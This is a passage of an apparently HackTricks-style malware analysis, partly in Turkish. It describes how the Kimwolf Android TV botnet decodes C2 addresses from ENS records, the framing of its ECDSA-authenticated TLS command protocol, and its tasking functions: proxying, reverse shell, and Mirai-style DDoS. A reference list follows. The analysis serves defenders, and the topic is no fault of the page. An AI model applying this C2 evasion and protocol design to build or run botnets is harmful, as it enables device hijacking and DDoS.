- Bot son dört baytı (`1b e7 85 99`) alır, bunları `0x93141715` ile XOR'lar ve sonucu bir IPv4 C2 (`136.243.146.140`) olarak yorumlar. ENS text kaydını güncellemek, blockchain aracılığıyla downstream C2'leri anında döndürür; DNS'e dokunmaya gerek yoktur.

### TLS + ECDSA authenticated command channel
- Trafik, wolfSSL içinde özel bir framed protokolle kapsüllenmiştir:
```go
struct Header {
Magic    [4]byte // e.g. "DPRK", "FD9177FF", "AD216CD4"
Reserved uint8   // 0x01
MsgType  uint8   // verb
MsgID    uint32
BodyLen  uint32
CRC32    uint32
}
```
- Bootstrap: the bot sends two empty `MsgType=0 (register)` headers. The C2 replies with `MsgType=1 (verify)` containing a random challenge plus an ASN.1 DER **ECDSA** signature. Bots verify it against an embedded SubjectPublicKeyInfo blob; failures terminate the session, preventing hijacked/sinkholed C2 nodes from tasking the fleet.
- Doğrulandıktan sonra bot, operatör tarafından tanımlanmış **group string** (örn. `android-postboot-rt`) içeren bir `MsgType=0` gövdesi gönderir. Eğer grup etkinse, C2 `MsgType=2 (confirm)` ile yanıt verir; bundan sonra tasking (MsgType 5–12) başlar.
- Desteklenen eylemler arasında SOCKS-style TCP/UDP proxying (residential proxy monetization), reverse shell / single command exec, file read/write ve **Mirai-compatible DDoSBody** payload'ları (aynı `AtkType`, `Duration`, `Targets[]`, `Flags[]` düzeni) bulunur.

## Kaynaklar

- [Unit42 – Evolving Tactics of SLOW#TEMPEST: A Deep Dive Into Advanced Malware Techniques](https://unit42.paloaltonetworks.com/slow-tempest-malware-obfuscation/)
- SoTap: Lightweight in-app JNI (.so) behavior logger – [github.com/RezaArbabBot/SoTap](https://github.com/RezaArbabBot/SoTap)
- Strategies for Analyzing Native Code in Android Applications: Combining Ghidra and Symbolic Execution for Code Decryption and Deobfuscation – [revflash.medium.com](https://revflash.medium.com/strategies-for-analyzing-native-code-in-android-applications-combining-ghidra-and-symbolic-aaef4c9555df)
- Ghidra – [github.com/NationalSecurityAgency/ghidra](https://github.com/NationalSecurityAgency/ghidra)
- angr – [angr.io](https://angr.io/)
- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
